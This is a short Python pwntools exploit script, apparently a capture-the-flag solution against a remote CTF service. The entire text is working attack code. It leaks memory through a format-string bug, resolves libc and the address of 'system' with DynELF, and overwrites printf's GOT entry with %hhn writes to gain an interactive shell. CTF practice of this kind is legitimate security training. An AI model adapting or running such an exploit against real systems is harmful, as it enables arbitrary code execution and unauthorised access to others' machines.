from pwn import *

#r = remote('0.0.0.0',4001)
r = remote('csie.ctf.tw',10145)

def leak(addr):
  r.sendline('%7$s>>>>'.ljust(8) + p64(addr))
  x = r.recvuntil('>>>>',drop=True) + '\x00'
  r.recv(timeout=0.1)
  print addr,repr(x)
  #print repr(x)
  #if len(bx) == 0:
  #  return '\x00'
  #print hex(addr),bx
  #print hex(addr),'->',enhex(bx)
  #print int(addr),'->',enhex(bx)
  return x

prog = DynELF(leak,0x400000)
print 'finish 0'
bases = prog.bases()
print 'finish prog'
for l in bases:
  if "libc" in l:
    ptr = bases[l]

print ptr
libc = DynELF(leak,ptr)
system = libc.lookup('system')
printf = libc.lookup('printf')
print system

offset = [0]*4
total = 0
for i in range(4):
  offset[i] = ((system>>(8*i)) - total) % 256
  total += offset[i]

printf_plt = 0x601020

r.sendline(('%' + str(offset[0]) + 'c%16$hhn' 
          + '%' + str(offset[1]) + 'c%17$hhn'
          + '%' + str(offset[2]) + 'c%18$hhn' ).ljust(80)
          + p64(printf_plt) + p64(printf_plt+1) + p64(printf_plt+2) )


r.interactive()

